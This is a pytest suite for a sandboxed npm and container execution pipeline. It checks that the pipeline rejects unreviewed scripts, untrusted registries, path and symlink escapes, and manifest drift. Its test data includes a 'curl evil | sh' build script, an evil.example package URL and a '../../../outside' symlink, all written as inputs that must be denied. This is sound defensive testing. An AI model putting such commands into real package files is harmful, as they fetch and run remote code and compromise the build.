import copy
import hashlib
import io
import json
from pathlib import Path
import tarfile
import pytest

import controller_gate
import executor
import manifest
import phase3_application as application
import phase3_dependencies as deps
import phase3_execution as execution
import phase3_prepare as preparation
import phase3_review as review
import phase3_sandbox as sandbox
from test_phase3_contract import result


def package_files():
    files={};entries={}
    for prefix,kind in (('','root'),('backend/','backend'),('frontend/','frontend')):
        body={'name':kind,'version':'0.0.1','private':True,'engines':{'node':'22.18.0','npm':'10.9.3'},'scripts':sandbox.SCRIPTS[kind]}
        if kind=='root':body['workspaces']=['backend','frontend']
        files[prefix+'package.json']=json.dumps(body).encode()
        entries[prefix.rstrip('/')]= {k:v for k,v in body.items() if k in ('name','version','engines','workspaces')}
    entries.update({f'node_modules/{k}':{'resolved':k,'link':True} for k in ('backend','frontend')})
    lock=json.dumps({'lockfileVersion':3,'packages':entries}).encode()
    for prefix in ('','backend/','frontend/'):files[prefix+'package-lock.json']=lock
    return files


@pytest.mark.parametrize('field,value',[('scripts',{'build':'curl evil | sh'}),('engines',{'node':'*'}),('dependencies',{'tsx':'latest'}),('postinstall','run')])
def test_unreviewed_commands_runtime_and_dependencies_denied(field,value):
    files=package_files();pkg=json.loads(files['backend/package.json']);pkg[field]=value;files['backend/package.json']=json.dumps(pkg).encode()
    with pytest.raises(ValueError):sandbox.packages(files)


@pytest.mark.parametrize('entry',[{'resolved':'https://evil.example/pkg.tgz','integrity':'sha512-'+('A'*86)+'=='},
                                {'resolved':'file:///C:/Users/private','link':True},
                                {'resolved':'https://registry.npmjs.org/pkg/-/pkg.tgz','integrity':'sha1-old'}])
def test_registry_lock_denies_arbitrary_hosts_links_and_weak_hashes(entry):
    files=package_files();lock=json.loads(files['package-lock.json']);lock['packages']['node_modules/pkg']=entry
    for name in ('package-lock.json','backend/package-lock.json','frontend/package-lock.json'):files[name]=json.dumps(lock).encode()
    with pytest.raises(ValueError):sandbox.packages(files)


def test_lock_binding_and_component_drift_are_denied():
    files=package_files();files['backend/package-lock.json']=b'{}'
    with pytest.raises(ValueError,match='Component lock'):sandbox.packages(files)
    files=package_files();lock=json.loads(files['package-lock.json']);lock['packages']['backend']['engines']={'node':'*'}
    files['package-lock.json']=json.dumps(lock).encode()
    with pytest.raises(ValueError,match='Package/lock'):sandbox.packages(files)


def test_registry_redirect_or_wrong_integrity_never_creates_a_cache(monkeypatch):
    with pytest.raises(ValueError):deps.RegistryRedirect().redirect_request(None,None,302,'',{},'https://evil.example')
    class Response:
        def __enter__(self):return self
        def __exit__(self,*a):pass
        def read(self,*a):return b'drift'
    class Opener:
        def open(self,*a,**k):return Response()
    monkeypatch.setattr(deps.urllib.request,'build_opener',lambda *a:Opener())
    with pytest.raises(ValueError,match='integrity'):deps.registry('https://registry.npmjs.org/pkg/-/pkg.tgz','sha512-wrong')
    with pytest.raises(ValueError,match='Registry denied'):deps.registry('https://user:secret@registry.npmjs.org/pkg.tgz','')


def test_archive_contains_only_captured_bytes_no_host_paths_or_links():
    data=sandbox.archive({'backend/src/app.ts':b'old bytes','package.json':b'{}'})
    with tarfile.open(fileobj=io.BytesIO(data)) as tar:
        assert all(m.isfile() and not m.name.startswith('/') and m.mode==0o444 for m in tar.getmembers())
        assert tar.extractfile('backend/src/app.ts').read()==b'old bytes'
    with pytest.raises(ValueError):sandbox.archive({'../private':b'secret'})


@pytest.mark.parametrize('kind',['node','browser'])
def test_worker_has_no_host_mount_ports_credentials_or_external_network(kind):
    argv=sandbox.container_argv(kind,'age50-bounded','age50-postgres')
    assert '--read-only' in argv and '--cap-drop' in argv and '--security-opt' in argv
    assert '--mount' not in argv and '--volume' not in argv and '--publish' not in argv
    assert argv[argv.index('--network')+1]=='container:age50-postgres'
    assert argv[argv.index('--user')+1]=='1000:1000'
    assert argv[argv.index('--memory')+1]==argv[argv.index('--memory-swap')+1]
    assert not any('socket' in arg or 'GITHUB' in arg or 'NOTION' in arg for arg in argv)


def test_static_code_markers_are_not_semantic_acceptance():
    candidate={'path':application.PATH,'content':'// /api/profiles /api/catalog/geography ./directory /registro Promocionados Listado básico groups( filters('}
    assert not application.defects(candidate) # Deliberately structural; real tests remain required.
    candidate['content']+=' dangerouslySetInnerHTML'
    assert {f['rule'] for f in application.defects(candidate)}=={'C03'}


def test_false_code_approval_is_vetoed_and_writer_replaces_full_file(tmp_path,monkeypatch):
    monkeypatch.setattr(controller_gate,'require_green',lambda:'exact')
    monkeypatch.setattr(review,'ROOT',tmp_path)
    journal=review.Journal(tmp_path/'review.sqlite')
    seed={'path':application.PATH,'content':'export default function App(){return null;}'}
    journal.create('code',seed,section='application')
    gold={'path':application.PATH,'content':'// /api/profiles /api/catalog/geography ./directory /registro Promocionados Listado básico groups( filters('}
    lock,docs,_=preparation.load_bundle()
    def call(row,op,*a):
        request={'model':row['binding']['model'],'digest':row['binding']['digest'],'messages':[{'role':'user','content':'Bounded test fixture'}],
                 'format':review.output_schema(row,op,lock,docs)}
        op['_record_request'](request)
        body=gold if op['role']=='developer' else {'checks':{k:{'passed':True,'pointer':'/content','quote':row['candidate']['content'][:15]} for k in application.RULES},'findings':[]}
        return result(body,prompt_sha256=manifest.identity(request['messages']))
    row=review.run(journal,'code',call)
    assert row['state']=='reviewed_application_file' and row['scope']=='application_file_review'
    assert row['calls']==3 and row['corrections']==1 and row['candidate']==gold
    from phase3_handoff import consume
    assert consume(journal,'code','application')[0]==row
    with pytest.raises(ValueError):consume(journal,'code','api')
    assert journal.records('code','plan_ops')[0]['candidate']==seed


def test_code_citations_and_rules_are_bound():
    candidate={'path':application.PATH,'content':'exact source'}
    body={'checks':{k:{'passed':True,'pointer':'/content','quote':'fabricated quote'} for k in application.RULES},'findings':[]}
    with pytest.raises(ValueError,match='Invented'):application.validate_review(body,candidate)


@pytest.mark.parametrize('command',['phase3-build-manifest','phase3-run-sandbox','phase3-cleanup-sandbox'])
def test_general_agent_routes_concrete_sandbox_commands(monkeypatch,command):
    import agent,controller_cli
    seen=[];monkeypatch.setattr(controller_cli,'main',lambda argv:seen.append(argv) or 0)
    assert agent.main([command])==0 and seen==[[command]]


def test_manifest_command_drift_denied_before_any_dispatch(tmp_path,monkeypatch):
    actual={'stages':{'unit':{'argv':['npm','run','test:unit']}}}
    monkeypatch.setattr(sandbox,'build_manifest',lambda *a:actual)
    candidate=copy.deepcopy(actual);candidate['stages']['unit']['argv']=['powershell','evil']
    with pytest.raises(ValueError,match='drift'):sandbox.validate_execution(candidate,tmp_path,{},manifest.identity(candidate))
    with pytest.raises(ValueError,match='digest'):sandbox.validate_execution(actual,tmp_path,{},'stale')


def test_pinned_migration_drift_blocks_bootstrap(tmp_path,monkeypatch):
    monkeypatch.setattr(execution,'ROOT',tmp_path);(tmp_path/'phase3_initial.sql').write_text('untrusted SQL')
    with pytest.raises(ValueError,match='migration drift'):execution.trusted_sql('ephemeral')


def test_cleanup_rejects_foreign_resource_without_removal(tmp_path,monkeypatch):
    journal=review.Journal(tmp_path/'review.sqlite');nonce='a'*32
    row={'id':'run','nonce':nonce,'binding':{},'binding_sha256':manifest.identity({}),
         'resources':{'node':'age50-'+nonce[:20]+'-node'},'cleanup':[]}
    calls=[]
    def proc(argv,*a,**k):
        calls.append(argv);return {'exit_code':0,'stdout':json.dumps([{'Config':{'Labels':{'agentapp.phase3.nonce':'foreign'}}}]).encode()}
    monkeypatch.setattr(execution,'process',proc)
    with pytest.raises(ValueError,match='ownership'):execution.cleanup(journal,row)
    assert len(calls)==1 and calls[0][1]=='inspect'


@pytest.fixture
def dispatch(tmp_path,monkeypatch):
    journal=review.Journal(tmp_path/'review.sqlite')
    code={'candidate':{'path':application.PATH,'content':'bounded fixture'}}
    files={application.PATH:b'bounded fixture'}
    monkeypatch.setattr(execution.handoff,'assemble',lambda *a:{'binding':{'suite_identity':'exact'},'plan':{}})
    monkeypatch.setattr(execution.handoff,'consume',lambda *a:(code,[],None,None))
    monkeypatch.setattr(sandbox,'validate_execution',lambda *a:{})
    monkeypatch.setattr(sandbox,'capture',lambda *a:({},files.copy()))
    monkeypatch.setattr(sandbox,'build_manifest',lambda *a:{})
    monkeypatch.setattr(execution,'cache_archive',lambda *a:(b'',{}))
    monkeypatch.setattr(controller_gate,'require_green',lambda:'exact')
    return journal,files,lambda:execution.run(journal,'dispatch',{},'source',tmp_path,{},'bound',tmp_path)


def test_interrupted_dispatch_never_resends_operation(dispatch,monkeypatch):
    journal,files,run=dispatch;calls=[]
    def proc(argv,*a,**k):
        calls.append(argv)
        if argv[1]=='create':raise OSError('Lost acknowledgement')
        return {'exit_code':1,'stdout':b'','stderr':b''}
    monkeypatch.setattr(execution,'process',proc)
    row=run();assert row['state']=='uncertain_operation' and row['operations'][0]['state']=='in_flight'
    before=len(calls);assert run()==row;assert len(calls)==before
    assert sum(argv[1]=='create' for argv in calls)==1


def test_failed_check_never_becomes_a_pass_or_an_automatic_retry(dispatch,monkeypatch):
    journal,files,run=dispatch;calls=[]
    def proc(argv,*a,**k):
        calls.append(argv)
        return {'exit_code':125,'stdout':b'','stderr':b'Unavailable','timed_out':False,'truncated':False,'duration_ms':1}
    monkeypatch.setattr(execution,'process',proc)
    row=run();assert row['state']=='failed' and not row['product_tests_executed']
    before=len(calls);assert run()==row and len(calls)==before


def test_global_budget_exhaustion_prevents_creation(dispatch,monkeypatch):
    journal,files,run=dispatch;calls=[]
    monkeypatch.setitem(sandbox.POLICY,'total_seconds',0)
    monkeypatch.setattr(execution,'process',lambda argv,*a,**k:calls.append(argv) or {'exit_code':1,'stdout':b''})
    row=run();assert row['state']=='blocked_budget' and row['operations']==[]
    assert all(argv[1]=='inspect' for argv in calls)


def test_source_drift_preserves_original_execution_record(dispatch,monkeypatch):
    journal,files,run=dispatch
    monkeypatch.setattr(execution,'process',lambda *a,**k: {'exit_code':125,'stdout':b'','stderr':b'','timed_out':False,'truncated':False,'duration_ms':1})
    original=run();files[application.PATH]=b'different'
    # Changed reviewed source is rejected even before execution identity reuse.
    with pytest.raises(ValueError,match='Reviewed source'):run()
    assert execution.get(journal,'dispatch')==original


def test_boolean_or_numeric_manifest_type_drift_denied(tmp_path,monkeypatch):
    actual={'enabled':False,'timeout':180}
    monkeypatch.setattr(sandbox,'build_manifest',lambda *a:actual)
    with pytest.raises(ValueError,match='drift'):sandbox.validate_execution({'enabled':0,'timeout':180.0},tmp_path,{})


def test_only_compatible_optional_binaries_are_acquired():
    entry={'resolved':'https://registry.npmjs.org/pkg/-/pkg.tgz','integrity':'sha512-example','os':['darwin'],'optional':True}
    assert 'sha512-example' not in deps.references({'packages':{'node_modules/pkg':entry}})
    entry['os']=['linux'];entry['cpu']=['x64'];assert 'sha512-example' in deps.references({'packages':{'node_modules/pkg':entry}})
    entry['cpu']=['arm64'];entry['optional']=False
    with pytest.raises(ValueError,match='Required dependency'):deps.references({'packages':{'node_modules/pkg':entry}})


def test_inert_build_context_and_dependency_symlink_escape_denied():
    source=sandbox.archive({'package.json':b'{}'})
    cache=io.BytesIO()
    with tarfile.open(fileobj=cache,mode='w') as tar:
        entry=tarfile.TarInfo('cache/item');entry.size=1;tar.addfile(entry,io.BytesIO(b'0'))
    context=execution.image_context('node',source,cache.getvalue(),'run','a'*32)
    with tarfile.open(fileobj=io.BytesIO(context)) as tar:
        dockerfile=tar.extractfile('Dockerfile').read().decode()
        assert 'RUN ' not in dockerfile and 'ADD ' not in dockerfile and sandbox.NODE in dockerfile
        assert tar.extractfile('work/package.json').read()==b'{}'
    bad=io.BytesIO()
    with tarfile.open(fileobj=bad,mode='w') as tar:
        entry=tarfile.TarInfo('node_modules/escape');entry.type=tarfile.SYMTYPE;entry.linkname='../../../outside';tar.addfile(entry)
    with pytest.raises(ValueError,match='link escape'):execution.image_context('browser',source,cache.getvalue(),'run','a'*32,bad.getvalue())


def test_photo_dto_scalar_mismatch_is_vetoed():
    code='// /api/profiles /api/catalog/geography ./directory /registro Promocionados Listado básico groups( filters(\nconst x=<img src={card.main_photo}/>;'
    assert any(f['rule']=='C01' and 'main_photo.url' in f['fix'] for f in application.defects({'path':application.PATH,'content':code}))
    assert not application.defects({'path':application.PATH,'content':code.replace('src={card.main_photo}','src={card.main_photo.url}')})


def test_only_dependency_tmpfs_can_execute_pinned_native_binaries():
    argv=sandbox.container_argv('node','age50-worker')
    mounts=[argv[i+1] for i,arg in enumerate(argv) if arg=='--tmpfs']
    assert any(m.startswith('/work/node_modules:') and ',exec,' in m for m in mounts)
    assert all(',exec,' not in m for m in mounts if not m.startswith('/work/node_modules:'))
    assert sandbox.POLICY['stage_order'].index('fe_build')<sandbox.POLICY['stage_order'].index('unit')


def test_npm_uses_fixed_runtime_paths_for_both_pinned_images():
    assert b'/usr/local/bin/node' in deps.NPM_LAUNCHER and b'/usr/bin/node' in deps.NPM_LAUNCHER
    assert b'exec node ' not in deps.NPM_LAUNCHER and b'"$@"' in deps.NPM_LAUNCHER
